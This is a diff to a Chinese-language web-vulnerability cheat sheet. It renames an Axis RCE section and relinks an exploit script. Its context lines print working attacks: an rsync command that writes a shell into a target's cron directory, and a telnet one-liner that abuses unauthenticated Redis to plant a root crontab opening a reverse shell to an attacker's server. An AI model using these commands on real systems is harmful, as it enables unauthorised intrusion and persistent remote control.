@@ -57,7 +57,7 @@ web常见漏洞：
 			* [Apache_SSI_远程命令执行漏洞](#Apache_SSI_远程命令执行漏洞)
 		* [rsync_未授权访问漏洞](#rsync_未授权访问漏洞)
 		* [redis_未授权访问漏洞](#redis_未授权访问漏洞)
-		* [axis1.4_rce漏洞](#axis1.4_rce漏洞)
+		* [axis_rce漏洞](#axis_rce漏洞)
 		* [CRLF_HTTP头注人](#CRLF_HTTP头注人)
 		* [HPP_参数污染漏洞](#HPP_参数污染漏洞)
 		* [反序列化漏洞](#反序列化漏洞)
@@ -710,10 +710,11 @@ rsync -av shell rsync://tarket-ip:873/path/etc/cron.d/shell
 一行命令计划任务反弹shell：
 (sleep 1;echo "info";sleep 2;echo "set x \"\n* * * * * bash -i >& /dev/tcp/vps_ip/8888 0>&1\n\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir /var/spool/cron";sleep 1;echo "config set dbfilename root";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
 ```
-### axis1.4_rce漏洞
+### axis_rce漏洞
+漏洞利用脚本：
+- [hacden/axis_enable_remote](https://github.com/hacden/Hack/blob/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/axis_enable_remote.py)
 ```
 参考：https://xz.aliyun.com/t/7981
-漏洞利用脚本：- [hacden/axis_enable_remote.py](https://github.com/hacden/Hack/blob/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/axis_enable_remote.py)
 ```
 ### CRLF_HTTP头注人
 > **多出现于302跳转类型,观察url或参数是否存在于返回包中**
